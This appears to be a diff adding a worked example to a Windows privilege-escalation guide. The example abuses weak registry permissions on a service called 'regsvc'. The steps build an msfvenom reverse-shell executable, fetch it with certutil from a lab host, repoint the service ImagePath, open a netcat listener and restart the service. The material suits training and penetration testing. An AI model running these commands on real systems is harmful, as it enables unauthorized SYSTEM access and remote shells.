@@ -314,3 +314,58 @@ KEY_WRITE               ← Can modify! 🚨
 . .\PowerUp.ps1
 Get-ModifiableServiceRegistry
 ```
+
+## Example:
+###  Found "regsvc" with weak registry permissions
+#### Step 1: Verify vulnerability
+```
+# Check current service settings
+sc qc regsvc
+
+# Check registry permissions
+accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+```
+
+**Output:**
+```
+RW NT AUTHORITY\INTERACTIVE    ← Logged-in users can WRITE! 🚨
+```
+
+
+#### Step 2: Check current ImagePath
+```
+reg query HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath
+```
+
+**Output:**
+```
+ImagePath    REG_EXPAND_SZ    C:\Program Files\Vuln Service\service.exe
+```
+
+#### Step 3: Create malicious payload
+```
+# On Kali
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
+```
+
+#### Step 4: Upload payload
+```
+certutil -urlcache -f http://10.10.10.5/shell.exe C:\Temp\shell.exe
+```
+
+#### Step 5: Modify ImagePath in registry
+```
+# Change registry to point to your shell
+reg add HKLM\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\shell.exe" /f
+```
+
+#### Step 6: Start listener
+```
+nc -lvnp 4444
+```
+
+#### Step 7: Restart service
+```
+net stop regsvc
+net start regsvc
+```
